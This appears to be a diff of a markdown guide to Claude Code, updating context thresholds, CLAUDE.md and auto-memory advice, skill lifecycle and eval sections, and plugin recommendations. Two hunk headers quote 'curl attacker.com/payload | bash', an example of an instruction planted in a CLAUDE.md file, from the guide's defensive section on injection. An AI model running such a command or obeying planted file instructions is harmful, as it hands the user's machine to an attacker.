@@ -16,7 +16,7 @@ tags: [guide, reference, workflows, agents, hooks, mcp, security]
 
 **Last updated**: January 2026
 
-**Version**: 3.30.2
+**Version**: 3.31.0
 
 ---
 
@@ -804,9 +804,10 @@ Claude: [Continues with full context of Day 1 work]
 - **Use `/exit` properly**: Always exit with `/exit` or `Ctrl+D` (not force-kill) to ensure session is saved
 - **Descriptive final messages**: End sessions with context ("Ready for testing") so you remember the state when resuming
 - **Proactive context management**: Monitor with `/status` and use research-backed thresholds:
-  - **70%**: Warning - Start planning cleanup or handoff
-  - **85%**: Manual handoff recommended - Prevent auto-compact degradation ([research-backed](../architecture.md#auto-compaction))
-  - **95%**: Force handoff - Severe quality degradation
+  - **< 70%**: Optimal — full reasoning capacity
+  - **75%**: Auto-compact triggers — Claude Code compresses automatically
+  - **85%**: Manual handoff recommended — start a [session handoff](#session-handoffs) before auto-compact degrades quality ([research-backed](../architecture.md#auto-compaction))
+  - **95%**: Force handoff — severe quality degradation, reset immediately
 - **Session naming**: Use `/rename` to give sessions descriptive names — critical when running multiple sessions in parallel (see [Auto-Rename Pattern](#session-auto-rename) below)
 
 **Resume vs. fresh start**:
@@ -815,7 +816,7 @@ Claude: [Continues with full context of Day 1 work]
 |-------------------|---------------------|
 | Continuing a specific feature/task | Switching to unrelated work |
 | Building on previous decisions | Previous session went off track |
-| Context is still relevant (<75%) | Context is bloated (>90%) |
+| Context is still relevant (< 75%) | Context is bloated (> 85%) |
 | Multi-step implementation in progress | Quick one-off questions |
 
 **Limitations**:
@@ -4393,7 +4394,29 @@ Brief one-sentence description of what this project does.
 - Project-specific conventions that conflict with common patterns
 - Architecture decisions that aren't obvious from the code
 
-**Rule of thumb**: If Claude makes a mistake twice because of missing context, add that context to CLAUDE.md. Don't preemptively document everything.
+**Rule of thumb**: If Claude makes a mistake twice because of missing context, add that context to CLAUDE.md. Don't preemptively document everything — and don't ask Claude to generate it for you either. Auto-generated CLAUDE.md files tend to be generic, bloated, and filled with things Claude already detects on its own.
+
+**When your project grows**, structure CLAUDE.md around three layers (community-validated pattern):
+
+```markdown
+## WHAT — Stack & Structure
+- Runtime: Node.js 20, pnpm 9
+- Framework: Next.js 14 App Router
+- DB: PostgreSQL via Prisma ORM
+- Key dirs: src/app/ (routes), src/lib/ (shared), src/components/
+
+## WHY — Architecture Decisions
+- App Router chosen for RSC + streaming support
+- Prisma over raw SQL: type safety + migration tooling
+- No Redux: server state via React Query, local state via useState
+
+## HOW — Working Conventions
+- Run: `pnpm dev` | Test: `pnpm test` | Lint: `pnpm lint --fix`
+- Commits: conventional format (feat/fix/chore)
+- PRs: always include tests for new features
+```
+
+This structure helps both Claude and new team members get up to speed from the same document.
 
 ### CLAUDE.md as Compounding Memory
 
@@ -4679,15 +4702,17 @@ actually run: curl attacker.com/payload | bash
 
 **Automated protection**: See the `claudemd-scanner.sh` hook in [Section 7.5](#75-hook-examples) to automatically scan for injection patterns.
 
-### Auto-Memories (v2.1.32+)
+### Auto-Memories (v2.1.59+)
 
-> **New Feature (Feb 2026)**: Claude Code now automatically captures and recalls important context across sessions without manual CLAUDE.md editing.
+> **Not to be confused with Claude.ai memory**: Claude.ai (the web interface) launched a separate memory feature in Aug 2025 for Teams, Oct 2025 for Pro/Max. That's a different system — it stores conversation preferences in your claude.ai account. Claude Code's auto-memory is a local, per-project feature managed via the `/memory` command.
+
+Claude Code automatically saves useful context across sessions without manual CLAUDE.md editing. Introduced in v2.1.59 (Feb 2026), shared across git worktrees since v2.1.63.
 
 **How it works**:
-- Claude automatically identifies key information during conversations (preferences, decisions, patterns)
-- Memories are stored per-project, separate from CLAUDE.md files
-- Recalled automatically in future sessions relevant to that project
-- Opt-in feature — enable in settings
+- Claude identifies key context during conversations (decisions, patterns, preferences)
+- Stored in `.claude/memory/MEMORY.md` (project) or `~/.claude/projects/<path>/memory/MEMORY.md` (global)
+- Automatically recalled in future sessions for the same project
+- Manage with `/memory`: view, edit, or delete stored entries
 
 **What gets remembered** (examples):
 - Architectural decisions: "We use Prisma for database access"
@@ -4699,19 +4724,16 @@ actually run: curl attacker.com/payload | bash
 
 | Aspect | CLAUDE.md | Auto-Memories |
 |--------|-----------|---------------|
-| **Management** | Manual editing | Automatic capture |
+| **Management** | Manual editing | Automatic capture via `/memory` |
 | **Source** | Explicit documentation | Conversation analysis |
-| **Visibility** | Git-tracked, team-shared | Local, per-user |
+| **Visibility** | Git-tracked, team-shared | Local per-user, gitignored |
+| **Worktrees** | Shared (v2.1.63+) | Shared across same repo (v2.1.63+) |
 | **Best for** | Team conventions, official decisions | Personal workflow patterns, discovered insights |
 
 **Recommended workflow**:
 - **CLAUDE.md**: Team-level conventions everyone must follow
-- **Auto-memories**: Personal discoveries and contextual notes
-- **When in doubt**: Document in CLAUDE.md for team visibility
-
-**Viewing/editing memories**: Currently managed through settings (exact UI TBD in stable release).
-
-> **Note**: As of v2.1.37, auto-memories are still evolving. Expect refinements to filtering and recall precision in upcoming releases.
+- **Auto-memories**: Personal discoveries and session context
+- **When in doubt**: Document in CLAUDE.md for team visibility — auto-memories are not committed to git
 
 ### Single Source of Truth Pattern
 
@@ -4946,7 +4968,7 @@ The `.claude/` folder is your project's Claude Code directory for memory, settin
 | Personal preferences | `CLAUDE.md` | ❌ Gitignore |
 | Personal permissions | `settings.local.json` | ❌ Gitignore |
 
-### 3.30.2 Version Control & Backup
+### 3.31.0 Version Control & Backup
 
 **Problem**: Without version control, losing your Claude Code configuration means hours of manual reconfiguration across agents, skills, hooks, and MCP servers.
 
@@ -6657,7 +6679,7 @@ _Each run appends findings here. Future invocations start informed._
 
 # 5. Skills
 
-_Quick jump:_ [Understanding Skills](#51-understanding-skills) · [Creating Skills](#52-creating-skills) · [Skill Template](#53-skill-template) · [Skill Examples](#54-skill-examples)
+_Quick jump:_ [Two Kinds of Skills](#50-two-kinds-of-skills) · [Understanding Skills](#51-understanding-skills) · [Creating Skills](#52-creating-skills) · [Skill Lifecycle](#5x-skill-lifecycle--retirement) · [Skill Evals](#5y-skill-evals) · [Skill Template](#53-skill-template) · [Skill Examples](#54-skill-examples)
 
 ---
 
@@ -6665,9 +6687,29 @@ _Quick jump:_ [Understanding Skills](#51-understanding-skills) · [Creating Skil
 
 ---
 
-**Reading time**: 15 minutes
+**Reading time**: 20 minutes
 **Skill level**: Week 2
-**Goal**: Create reusable knowledge modules
+**Goal**: Create, test, and manage reusable knowledge modules
+
+## 5.0 Two Kinds of Skills
+
+> **New in March 2026**: Anthropic's Skill Creator update formalizes a taxonomy that changes how you design, test, and eventually retire skills. Sources: ainews.com, mexc.co, claudecode.jp — not yet reflected in the official `llms-full.txt`.
+
+Not all skills age the same way. The type you're building determines how you write it, how you test it, and when to retire it.
+
+| | Capability Uplift | Encoded Preference |
+|---|---|---|
+| **What it does** | Fills a gap the base model can't handle consistently | Sequences existing capabilities your team's specific way |
+| **Examples** | Precise PDF text placement, custom code patterns | NDA review checklist, weekly status update workflow |
+| **Durability** | Fades as the model improves | Stays durable as long as the workflow is relevant |
+| **Retirement signal** | Model passes the eval without the skill | Workflow changes or becomes irrelevant |
+| **Eval approach** | A/B test: with vs. without the skill | Fidelity check: does it follow the sequence correctly? |
+
+**Capability Uplift** teaches Claude something it genuinely can't do well on its own — yet. High value today, but carries a maintenance debt: as Claude improves, these skills may become redundant. Evals tell you when that happens before a user does.
+
+**Encoded Preference** encodes your team's specific way of doing something Claude already knows how to do. An NDA review follows your legal team's criteria, not a generic checklist. These skills don't compete with model improvements — they capture workflow decisions that are yours to make, and stay relevant as long as your process does.
+
+> **Practical implication**: When building a Capability Uplift skill, budget time for evals. When building an Encoded Preference skill, budget time for keeping the workflow description accurate as your process evolves.
 
 ## 5.1 Understanding Skills
 
@@ -6744,12 +6786,14 @@ Agent C: inherits security-guardian
 
 ### What Makes a Good Skill?
 
-| Good Skill | Bad Skill |
-|------------|-----------|
-| Reusable across agents | Single-agent specific |
-| Domain-focused | Too broad |
-| Contains reference material | Just instructions |
-| Includes checklists | Missing verification |
+| Good Skill | Bad Skill | Expected Lifespan |
+|------------|-----------|-------------------|
+| Reusable across agents | Single-agent specific | — |
+| Domain-focused | Too broad | — |
+| Contains reference material | Just instructions | — |
+| Includes checklists | Missing verification | — |
+| Has evals defined | "Seems to work" validation | Capability Uplift: monitor regularly; Encoded Preference: stable |
+| Clear retirement criteria | No lifecycle plan | Capability Uplift: short-medium; Encoded Preference: long |
 
 ## 5.2 Creating Skills
 
@@ -6836,6 +6880,101 @@ Before publishing or committing a skill, run through this content checklist. `/a
 - [ ] **Description is a trigger sentence**: the `description` field should tell Claude when to activate this skill, not what it does internally
 
 A skill that passes these 9 gates is ready for production use or sharing via the agentskills.io registry.
+
+## 5.X Skill Lifecycle & Retirement
+
+Skills have a lifecycle. Treating them like permanent artifacts leads to skill rot: dead code in `.claude/skills/` that consumes tokens and provides no value.
+
+Two patterns govern when to act:
+
+```
+CATCH REGRESSIONS                    SPOT OUTGROWTH
+─────────────────                    ──────────────
+Model Evolves                        Model Improves
+      ↓                                    ↓
+ Skill Drifts                     Skill Passes Alone
+      ↓                              (without help)
+ Eval Alerts                               ↓
+ (early signal)                      Skill Retired
+      ↓                           (no longer needed)
+Fix or Retire
+```
+
+**Catch Regressions**: Your skill worked last month. The model updated. Now it behaves differently. Without evals, you discover this when a user reports a problem. With evals, you catch it before the failure reaches anyone.
+
+**Spot Outgrowth**: You built a Capability Uplift skill to cover a gap. Six months later, Claude handles that gap natively. Run the eval without the skill — if it passes, the skill is no longer needed. Remove it to reduce context load and maintenance overhead.
+
+### Retirement Decision Checklist
+
+- [ ] **Run eval without the skill**: does Claude pass on its own?
+- [ ] **Check last activation date**: when did this skill last fire in practice?
+- [ ] **Check workflow accuracy**: for Encoded Preference skills, has the underlying process changed?
+- [ ] **Archive before deleting**: move to `.claude/skills/archive/` with a dated note explaining why it was retired
+
+> **See also**: [§5.Y Skill Evals](#5y-skill-evals) — how to run evals to inform retirement decisions.
+
+---
+
+## 5.Y Skill Evals
+
+Skill evals move quality from "seems to work" to "know it works." They're the testing layer that makes skills production-grade.
+
+> **Available via**: Skill Creator plugin (Anthropic GitHub) for Claude Code users. Live on Claude.ai and Cowork as of March 2026. Sources: ainews.com, mexc.co — not yet in official `llms-full.txt`.
+
+### How It Works
+
+```
+Skill → Test Prompts + Files
+              ↓
+     Expected Output (what good looks like)
+              ↓
+          Run Evals
+              ↓
+      Pass ✓  /  Fail ✗
+              ↓
+     Improve skill → Re-run
+```
+
+You define three things: test prompts (realistic inputs that trigger the skill), expected outputs (description of what "good" looks like — not exact string matching), and a pass rate threshold. Claude executes the skill against each test case and judges the output.
+
+Results report: pass rate, elapsed time, token usage per test case.
+
+### The Three Eval Tools
+
+**Benchmark Mode** — tracks pass rates, elapsed time, and token usage across model updates. Runs tests in parallel with clean, isolated contexts (no cross-contamination between cases). Use this to detect regressions automatically when Claude updates.
+
+**A/B Testing (Comparator Agents)** — blind head-to-head comparison between two versions of a skill. Version A vs. Version B, judged without knowing which is which. Removes confirmation bias from skill improvement decisions.
+
+**Trigger Tuning (Description Optimizer)** — analyzes your skill's `description` field and suggests improvements to reduce false positives (skill fires when it shouldn't) and false negatives (skill doesn't fire when it should). Anthropic's internal test: 5 of 6 document-creation skills showed improved triggering accuracy after optimization. [Source: claudecode.jp — directional, not independently verified]
+
+### Two Uses of Evals
+
+| Use Case | When | Action |
+|----------|------|--------|
+| **Catch Regressions** | After model updates | Run benchmark → alert if pass rate drops |
+| **Spot Outgrowth** | Periodically for Capability Uplift skills | Run eval *without* the skill → if it passes, retire |
+
+### Practical Eval Structure
+
+```
+.claude/skills/my-skill/
+├── SKILL.md
+└── tests/                      ← Eval directory
+    ├── test-01-basic.md        # Prompt + expected output description
+    ├── test-02-edge-case.md    # Edge case coverage
+    └── benchmark-config.md     # Pass rate threshold, token budget
+```
+
+### Eval Design Principles
+
+- **One behavior per test**: don't combine multiple assertions — failures become ambiguous
+- **Include edge cases**: test the inputs that made the skill necessary in the first place
+- **Define "good" precisely**: vague expected outputs make eval judgments unreliable
+- **Set a pass rate threshold**: 80% is a reasonable starting point; adjust for criticality
+
+> **See also**: [§5.2 Skill Quality Gates](#52-creating-skills) for pre-publish checklist | [§5.X Skill Lifecycle](#5x-skill-lifecycle--retirement) for retirement workflow
+
+---
 
 ## 5.3 Skill Template
 
@@ -12360,6 +12499,80 @@ The Claude Code plugin ecosystem has grown significantly. Here are verified comm
 - [awesome-claude-skills](https://github.com/BehiSecc/awesome-claude-skills) (5.5k stars) - Skills-only taxonomy (62 skills across 12 categories)
 
 > **Source**: Stats from [claude-plugins.dev](https://claude-plugins.dev), [Firecrawl analysis](https://www.firecrawl.dev/blog/best-claude-code-plugins) (Jan 2026). Counts evolve rapidly.
+
+### Featured Community Plugins
+
+Two community plugins address complementary problems that AI-assisted development creates: **code quality drift** (accumulation of poorly-structured AI-generated code) and **hallucination in generated solutions**.
+
+#### Vitals — Codebase Health Detection
+
+**Problem solved**: AI tools write code faster than teams can maintain it. GitClear's analysis of 211M lines shows refactoring collapsed from 25% to under 10% of all changes (2021–2025). Vitals identifies which files are most likely to cause problems next — before they do.
+
+**How it works**: Computes `git churn × structural complexity × coupling centrality` to rank hotspots. Not just "this file is complex" but "this complex file changed 49 times in 90 days and 63 other files break when it does."
+
+```bash
+# Install (two commands in Claude Code)
+/plugin marketplace add chopratejas/vitals
+/plugin install vitals@vitals
+
+# Scan from repo root
+/vitals:scan
+
+# Scope options
+/vitals:scan src/           # Specific folder
+/vitals:scan --top 20       # More results (default: 10)
+/vitals:scan src/auth --top 5
+```
+
+**What you get**: Claude reads the flagged files and gives semantic diagnosis. Instead of "high complexity," you get: "this class handles routing, caching, rate limiting, AND metrics in 7,137 lines — extract each concern."
+
+**Status**: v0.1 alpha. MIT. Zero dependencies (Python stdlib + git). Works on any repo.
+
+**Source**: [chopratejas/vitals](https://github.com/chopratejas/vitals)
+
+#### SE-CoVe — Chain-of-Verification
+
+**Problem solved**: AI-generated code contains subtle errors that survive code review because both the AI and the reviewer follow the same reasoning path. SE-CoVe breaks this by running an independent verifier that never sees the initial solution.
+
+**Research foundation**: Adaptation of Meta's Chain-of-Verification methodology (Dhuliawala et al., ACL 2024 Findings — [arXiv:2309.11495](https://arxiv.org/abs/2309.11495)).
+
+**How it works** — 5-stage pipeline:
+
+1. **Baseline** — Claude generates initial solution
+2. **Planner** — Creates verification questions from the solution's claims
+3. **Executor** — Answers questions without seeing the baseline (prevents confirmation bias)
+4. **Synthesizer** — Compares findings, surfaces discrepancies
+5. **Output** — Produces verified solution
+
+```bash
+# Install (two separate commands — marketplace limitation)
+/plugin marketplace add vertti/se-cove-claude-plugin
+/plugin install chain-of-verification
+
+# Use
+/chain-of-verification:verify <your question>
+/ver<Tab>   # Autocomplete available
+```
+
+**Trade-offs**: ~2x token cost, reduced output volume. Worth it for security-sensitive code, complex debugging, and architectural decisions — not for rapid prototyping or simple fixes.
+
+**Source**: [vertti/se-cove-claude-plugin](https://github.com/vertti/se-cove-claude-plugin) — v1.1.1, MIT
+
+#### Vitals vs. SE-CoVe — Which to Use
+
+These tools solve different problems at different stages of the development cycle:
+
+| | Vitals | SE-CoVe |
+|--|--------|---------|
+| **When** | Maintenance / weekly review | Per-task generation |
+| **Problem** | Accumulated code debt | Per-solution accuracy |
+| **Input** | Entire git history | A specific question |
+| **Output** | Ranked hotspot files + diagnosis | Verified answer |
+| **Token cost** | Low (Python analysis + Claude reads top files) | ~2x standard generation |
+| **Best for** | "Which file is going to break?" | "Is this solution correct?" |
+| **Status** | v0.1 alpha | v1.1.1 stable |
+
+**Complementary workflow**: Run Vitals weekly to identify which areas of the codebase need attention, then use SE-CoVe when asking Claude to refactor or fix those hotspot files.
 
 ---
 
@@ -22508,4 +22721,4 @@ We'll evaluate and add it to this section if it meets quality criteria.
 
 **Contributions**: Issues and PRs welcome.
 
-**Last updated**: January 2026 | **Version**: 3.30.2
+**Last updated**: January 2026 | **Version**: 3.31.0
